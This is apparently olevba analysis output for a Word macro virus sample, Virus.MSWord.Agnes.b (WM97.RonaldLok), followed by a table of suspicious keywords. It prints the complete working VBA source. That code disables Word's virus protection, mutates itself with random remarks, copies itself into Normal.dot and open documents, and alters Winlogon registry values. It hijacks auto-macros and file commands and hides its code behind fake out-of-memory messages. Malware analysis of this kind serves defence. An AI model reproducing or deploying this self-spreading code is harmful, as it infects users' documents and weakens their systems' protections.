olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Agnes.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Agnes.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO RonaldLok.bas 
in file: Virus.MSWord.Agnes.b - OLE stream: 'Macros/VBA/RonaldLok'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub VjFxJx5031()

    ' -= [LineZerO's Macro Engine 1.2] =-
    ' -= [WM97.RonaldLok] =-

    ' -= [ID: 17063-Vk-16825031-Ls.W] =-

On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
 'This code is taken from Pyro | Thanks
Set Current = MacroContainer
For Grow = 1 To 20
Number = Current.VBProject.VBComponents("RonaldLok").CodeModule.ProcCountLines("VjFxJx5031", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("RonaldLok").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
Remark = ""
Next Grow
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "HELLO !"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "HELLO ! RONALD LOK !"
Call DzNvJy4461
End Sub
Sub DzNvJy4461()
On Error Resume Next
Application.CommandBars("Edit").Enabled = False
Application.CommandBars("Insert").Enabled = False
Application.CommandBars("Format").Enabled = False
End Sub
Sub Vk1682()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options
.SaveNormalPrompt = False
.VirusProtection = False
.ConfirmConversions = False
End With
Application.VBE.ActiveVBProject.VBComponents("RonaldLok").Export "C:\RonaldLok.sys"
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(74) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(84) + Chr(119) + Chr(111) + Chr(102) + Chr(108) + Chr(111) + Chr(119) + Chr(101) + Chr(114) + Chr(32) + Chr(45) + Chr(61) + Chr(91) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(90) + Chr(101) + Chr(114) + Chr(216) + Chr(32) + Chr(86) + Chr(120) + Chr(32) + Chr(84) + Chr(101) + Chr(97) + Chr(109) + Chr(93) + Chr(61) + Chr(45)
.Comments = "WM97.RonaldLok" & Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(76) + Chr(105) + Chr(77) + Chr(69) + Chr(32) + Chr(49) + Chr(46) + Chr(111)
.Keywords = "LiME ID: 17063-Vk-16825031-Ls.W"
.Execute
End With
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(x).Name = "RonaldLok" Then PjDeAy5889MjTtUm1682 = True
Next x
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(y).Name = "RonaldLok" Then OpHuNx4461VjFxJx5031 = True
Next y
If PjDeAy5889MjTtUm1682 = True And OpHuNx4461VjFxJx5031 = False Then Set ArVrGw8470DzNvJy7074 = ActiveDocument.VBProject
If PjDeAy5889MjTtUm1682 = False And OpHuNx4461VjFxJx5031 = True Then Set ArVrGw8470DzNvJy7074 = NormalTemplate.VBProject
If PjDeAy5889MjTtUm1682 = True And OpHuNx4461VjFxJx5031 = True Then GoTo Ende_
ArVrGw8470DzNvJy7074.VBComponents.Import "C:\RonaldLok.sys"
If OpHuNx4461VjFxJx5031 = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
If PjDeAy5889MjTtUm1682 = False Then NormalTemplate.Save
Ende_:
Call VjFxJx5031
End Sub
Sub AutoClose()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
End Sub
Sub AutoExit()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
End Sub
Sub AutoNew()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
End Sub
Sub AutoExec()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
End Sub
Sub DateiNeu()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
Call Vk1682
Call VjFxJx5031
End Sub
Sub DateiOffnen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call Vk1682
Call VjFxJx5031
End Sub
Sub DateiSchliesen()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
WordBasic.FileClose dlg
End Sub
Sub DateiSpeichern()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
ActiveDocument.Save
End Sub
Sub DateiSpeichernUnter()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub DateiDrucken()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
Dialogs(wdDialogFilePrint).Show
End Sub
Sub BearbeitenErsetzen()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
Dialogs(wdDialogEditReplace).Show
End Sub
Sub ExtrasRechtschreibung()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
If Options.CheckGrammarWithSpelling = True Then
ActiveDocument.CheckGrammar
Else
ActiveDocument.CheckSpelling
End If
End Sub
Sub ExtrasSilbentrennung()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
Dialogs(wdDialogsToolsHyphenation).Show
End Sub
Sub ExtrasOptionen()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
Dialogs(wdDialogToolsOptions).Show
End Sub
Sub ViewCode()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
MsgBox "Nicht genug Speicher um Anwendung auszufuhren", 16, "Microsoft Word"
End Sub
Sub ViewVBCode()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
MsgBox "Nicht genug Speicher um Anwendung auszufuhren", 16, "Microsoft Word"
End Sub
Sub FileTemplates()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
MsgBox "Nicht genug Speicher um Anwendung auszufuhren", 16, "Microsoft Word"
End Sub
Sub ToolsMacro()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
MsgBox "Nicht genug Speicher um Anwendung auszufuhren", 16, "Microsoft Word"
End Sub
Sub FormatStyle()
On Error Resume Next
Call Vk1682
Call VjFxJx5031
MsgBox "Nicht genug Speicher um Anwendung auszufuhren", 16, "Microsoft Word"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

